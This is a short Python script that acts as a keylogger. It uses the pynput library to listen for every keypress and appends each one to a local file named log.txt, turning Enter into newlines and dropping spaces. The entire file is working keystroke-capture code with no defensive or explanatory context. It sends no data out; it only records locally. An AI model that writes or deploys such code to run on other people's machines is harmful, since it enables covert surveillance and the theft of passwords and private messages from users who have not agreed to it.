from pynput.keyboard import Listener

def key(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.space":
        key = ""
    if key == "Key.enter":
        key = "\n"
    f = open('log.txt', 'a', encoding='utf8')
    f.write(key)
    f.close()

obj = Listener(on_press=key)
obj.start()
obj.join()
